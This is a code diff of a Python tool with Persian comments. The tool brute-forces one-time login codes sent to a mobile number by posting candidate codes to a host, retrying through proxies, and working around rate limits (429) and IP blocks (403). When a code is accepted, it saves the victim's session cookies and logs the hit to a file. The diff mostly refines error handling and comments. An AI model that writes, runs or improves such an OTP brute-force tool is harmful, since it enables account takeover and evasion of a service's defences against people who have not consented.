@@ -84,21 +84,24 @@ def send_request(host, login_otp_nonce, mobile, code_values, counter, proxy="", 
         if stop_event.is_set():
             return False
         try:
-            if proxy:  # اگه پروکسی باشه، اول با پروکسی امتحان کن
+            # اگه پروکسی باشه، با پروکسی درخواست رو بفرست
+            if proxy:
                 proxies = {"http": proxy, "https": proxy}
                 try:
                     response = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=15)
                     response.raise_for_status()
                 except requests.exceptions.RequestException as proxy_error:
-                    # اگه پروکسی کار نکرد (مثلاً SSL یا هر خطای دیگه)، بدون پروکسی بفرست
+                    # اگه پروکسی خطا داد، بدون پروکسی امتحان کن
                     progress_log.append(f"Proxy failed for code {code_str} (attempt {attempt + 1}): {str(proxy_error)}. Retrying without proxy...")
                     print(f"Proxy failed: {str(proxy_error)}. Retrying without proxy...")
                     response = requests.post(url, headers=headers, data=data, timeout=15)
                     response.raise_for_status()
-            else:  # بدون پروکسی
+            else:
+                # اگه پروکسی نباشه، مستقیم بدون پروکسی بفرست
                 response = requests.post(url, headers=headers, data=data, timeout=15)
                 response.raise_for_status()
 
+            # پردازش پاسخ
             try:
                 json_response = response.json()
                 print(f"Response for code {code_str}: {json_response}")
@@ -108,13 +111,13 @@ def send_request(host, login_otp_nonce, mobile, code_values, counter, proxy="", 
                            f"Redirect to: {json_response['data']['redirect']}")
                     progress_log.append(msg)
                     print(msg)
-                    save_cookies(response.cookies, code_str)
-                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-                    output_file = f"success_{code_str}_{timestamp}.txt"
-                    with open(output_file, 'w', encoding='utf-8') as f:
-                        f.write(msg + "\nLast cookie file will be available after process stops.\n")
-                    progress_log.append(f"Output saved in {output_file}")
-                    print(f"Output saved in {output_file}")
+                    if save_cookies(response.cookies, code_str):
+                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                        output_file = f"success_{code_str}_{timestamp}.txt"
+                        with open(output_file, 'w', encoding='utf-8') as f:
+                            f.write(msg + "\nLast cookie file: {last_cookie_file}\n")
+                        progress_log.append(f"Output saved in {output_file}")
+                        print(f"Output saved in {output_file}")
                     current_status["error"] = f"Code {code_str} found successfully!"
                     current_status["running"] = False
                     found_success = True
@@ -134,17 +137,17 @@ def send_request(host, login_otp_nonce, mobile, code_values, counter, proxy="", 
         except requests.exceptions.RequestException as e:
             error_msg = str(e)
             if isinstance(e, requests.exceptions.HTTPError):
-                if e.response.status_code == 429:
+                if e.response and e.response.status_code == 429:
                     error_msg = "Rate Limit exceeded (429)"
-                elif e.response.status_code == 403:
+                elif e.response and e.response.status_code == 403:
                     error_msg = "IP blocked by server (403)"
-                elif e.response.status_code == 503:
+                elif e.response and e.response.status_code == 503:
                     error_msg = "Server unavailable (503)"
             progress_log.append(f"Network error with code {code_str} (attempt {attempt + 1}/{max_retries + 1}): {error_msg}")
             print(f"Network error with code {code_str} (attempt {attempt + 1}/{max_retries + 1}): {error_msg}")
             current_status["error"] = error_msg
             if attempt < max_retries:
-                time.sleep(2)
+                time.sleep(2)  # تاخیر قبل از تلاش دوباره
                 continue
             return False
 
